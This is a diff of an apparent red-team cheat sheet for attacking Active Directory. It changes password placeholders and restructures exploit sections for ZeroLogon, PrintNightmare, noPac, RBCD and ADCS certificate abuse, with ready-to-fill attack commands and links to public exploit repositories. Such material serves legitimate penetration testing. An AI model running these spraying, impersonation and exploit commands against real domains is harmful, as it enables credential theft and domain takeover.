@@ -116,12 +116,12 @@
 ## Password Spray (external)
 
 * MFASweep
-   * `Invoke-MFASweep -Username <email> -Password <password>`
+   * `Invoke-MFASweep -Username <email> -Password <pass>`
 * MSOLSpray
-   * `Invoke-MSOLSpray -UserList users.txt -Password <password>`
+   * `Invoke-MSOLSpray -UserList users.txt -Password <pass>`
 * SprayingToolkit
    * `python3 atomizer.py owa <domain> --recon`
-   * `python3 atomizer.py owa <domain> <password> users.txt`
+   * `python3 atomizer.py owa <domain> <pass> users.txt`
 
 
 ## Password Spray (internal)
@@ -140,10 +140,10 @@
       * `Get-ADDefaultDomainPasswordPolicy`
    * See CrackMapExec section
 * Kerbrute
-   * `kerbrute passwordspray -d <domain> users.txt <password> [--dc <ip>]`
+   * `kerbrute passwordspray -d <domain> users.txt <pass> [--dc <ip>]`
    * Don't forget to try: `--user-as-pass`
 * PowerShell
-   * `Invoke-DomainPasswordSpray -Password <password> -Force -OutFile spray.txt`
+   * `Invoke-DomainPasswordSpray -Password <pass> -Force -OutFile spray.txt`
 
 
 ## CrackMapExec
@@ -354,8 +354,8 @@
 ## Resource-Based Constrained Delegation Abuse (RBCD)
 
 * Create new machine account (with PowerMad)
-   * Option 1 - `PowerMad: New-MachineAccount -MachineAccount <computername> -Password $(ConvertTo-SecureString '<password>' -AsPlainText -Force)`
-   * Option 2 - `SharpMad: Sharpmad.exe MAQ -Action new -MachineAccount <computername> -MachinePassword <password>`
+   * Option 1 - `PowerMad: New-MachineAccount -MachineAccount <computername> -Password $(ConvertTo-SecureString '<pass>' -AsPlainText -Force)`
+   * Option 2 - `SharpMad: Sharpmad.exe MAQ -Action new -MachineAccount <computername> -MachinePassword <pass>`
 * Create SecurityDescriptor
    * `$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid`
    * `$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"`
@@ -720,22 +720,41 @@ $assem = [System.Reflection.Assembly]::Load($data)
 [Rubeus.Program]::Main("dump".Split())
 ```
 
-## PrintNightmare
 
-* Vulnerable
-   * https://github.com/byt3bl33d3r/ItWasAllADream
-   * `REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"`
-* C#
-   * https://github.com/cube0x0/CVE-2021-1675
-* PowerShell (LPE)
-   * https://github.com/calebstewart/CVE-2021-1675
-* Patched as of September 15th, 2021
+## PrivExchange
+* https://github.com/Ridter/Exchange2domain
+* Patched as of Feburary 12th, 2019
+
+
+## ZeroLogon
+
+* Check
+  * `crackmapexec smb <ip> -d <domain> -u <user> -p <pass> -M zerologon`
+  * `lsadump::zerologon /target:<dc_fqdn> /account:<dc01$>`
+* Exploit
+  * https://github.com/dirkjanm/CVE-2020-1472
+  * https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon
+  * Or use Mimikatz (lsadump::zerologon)
+* Patched as of August 11th, 2020
 
 
 ## HiveNightmare / SeriousSAM
 
 * https://github.com/GossiTheDog/HiveNightmare
 * Patched as of August 10th, 2021
+
+
+## PrintNightmare
+
+* Check
+  * `rpcdump.py @<ip> | egrep 'MS-RPRN|MS-PAR'`
+  * `REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"`
+* Exploit
+   * https://github.com/cube0x0/CVE-2021-1675
+   * https://github.com/calebstewart/CVE-2021-1675
+   * https://github.com/outflanknl/PrintNightmare
+   * Or use Mimikatz (misc::printnightmare)
+* Patched as of September 15th, 2021
 
 
 ## samAccountName spoofing / noPac
@@ -745,10 +764,13 @@ $assem = [System.Reflection.Assembly]::Load($data)
    * 1 DC not patched with either KB5008380 or KB5008602
    * Any valid domain user account
    * Machine Account Quota (MAQ) above 0 (by default it is 10)
-* Examples
-   * `noPac.exe scan -domain htb.local -user user -pass "password123"`
-   * `noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt`
-   * `noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator`
+* Check
+   * `noPac.exe scan -domain <domain> -user <user> -pass <pass>`
+* Exploit
+    * https://github.com/cube0x0/noPac
+     * `noPac.exe -domain <domain> -user <user> -pass <pass> /dc <dc_fqdn> /mAccount demo123 /mPassword Password123! /service cifs /ptt`
+     * `noPac.exe -domain <domain> -user <user> -pass <pass> /dc <dc_fqdn> /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator`
+   * https://github.com/Ridter/noPac
 * Patched as of November 9th, 2021
 
 
@@ -774,7 +796,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 
 * Check for CA:
   * Linux
-    * `rpc net group members "Cert Publishers" -U "<domain>"/"<user>"%"<password>" -S "<dc>"`
+    * `rpc net group members "Cert Publishers" -U "<domain>"/"<user>"%"<pass>" -S "<dc>"`
   * Windows
     * `certutil -config - -ping`
     * `net group "Cert Publishers" /domain`
@@ -789,7 +811,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
    * This is a kind of inception: when a certificate template specifies the "Certificate Request Agent" EKU, it is possible to request a certificate from this template first and then use this certificate to request certificates on behalf of other users.
    * Example:
       * `Certify.exe request <server\ca-name> /template:<template>`
-      * `Certify.exe request <server\ca-name> /template:User /onbehalfon:<domain>\<da> /enrollcert:<cert.pfx> /enrollcertpw:<password>`
+      * `Certify.exe request <server\ca-name> /template:User /onbehalfon:<domain>\<da> /enrollcert:<cert.pfx> /enrollcertpw:<pass>`
 * ESC4 - Vulnerable Certificate Template Access Control
    * If an attacker has FullControl or WriteDacl permissions over a certificate template’s AD object, this allows them to push a misconfiguration to a template that is not otherwise vulnerable, leading to ESC1 vulnerability. Always check the "Permissions" column if you have run Certify, and pay attention to, for example, "Full Control" or "WriteDacl". If Domain Users or Domain Computers appear in this list, you can change attributes yourself in the template. For example, you can set the EKU to "Client Authentication", you can disable manager approval, etc.
    * Examples can be found here: https://redteam.wiki/postexploitation/active-directory/adcs/esc4
@@ -813,8 +835,8 @@ $assem = [System.Reflection.Assembly]::Load($data)
    * Then force authentication to your host, for example via Printerbug, Petitpotam, or Coercer.
 * Notes
    * In some cases, domain computers are allowed to request certificates (instead of domain users). If the "ms-ds-MachineAccountQuota" is set to > 1, it is possible to create a computer account yourself with PowerMad or SharpMad. Then you can request a TGT for this machine account using Rubeus. And then request a certificate with an altname (so a Domain Admin) using Certify.
-   * Option 1 - `PowerMad: New-MachineAccount -MachineAccount <computername> -Password $(ConvertTo-SecureString '<password>' -AsPlainText -Force)`
-   * Option 2 - `SharpMad: Sharpmad.exe MAQ -Action new -MachineAccount <computername> -MachinePassword <password>`
+   * Option 1 - `PowerMad: New-MachineAccount -MachineAccount <computername> -Password $(ConvertTo-SecureString '<pass>' -AsPlainText -Force)`
+   * Option 2 - `SharpMad: Sharpmad.exe MAQ -Action new -MachineAccount <computername> -MachinePassword <pass>`
 * Cobalt Strike
    * Check vulnerable for certificate templates
       * `inlineExecute-Assembly --dotnetassembly Certify.exe --assemblyargs find /vulnerable --amsi --etw`
@@ -883,7 +905,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 * Get all users with an SPN set for Kerberoasting
    * `ldapsearch "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"`
 * LDAP Signing
-   * `ldapsearch -LLL -H ldap://dc01.domain.local -x -D 'domain\username' -w '<password>' -b 'dc=domain,dc=local' '(&(objectClass=person)(samAccountName=username))' samAccountName`
+   * `ldapsearch -LLL -H ldap://dc01.domain.local -x -D 'domain\username' -w '<pass>' -b 'dc=domain,dc=local' '(&(objectClass=person)(samAccountName=username))' samAccountName`
    * When LDAP server signing is required the following message will appear: authentication required (8)
 
 
@@ -955,6 +977,6 @@ $assem = [System.Reflection.Assembly]::Load($data)
 * Seatbelt
    * `Seatbelt.exe -group=all`
 * SharpAdidnsdump
-   * `SharpAdidnsdump.exe <dc_ip>`
+   * `SharpAdidnsdump.exe <dc>`
 * SharpShares
    * `SharpShares.exe /ldap:all`
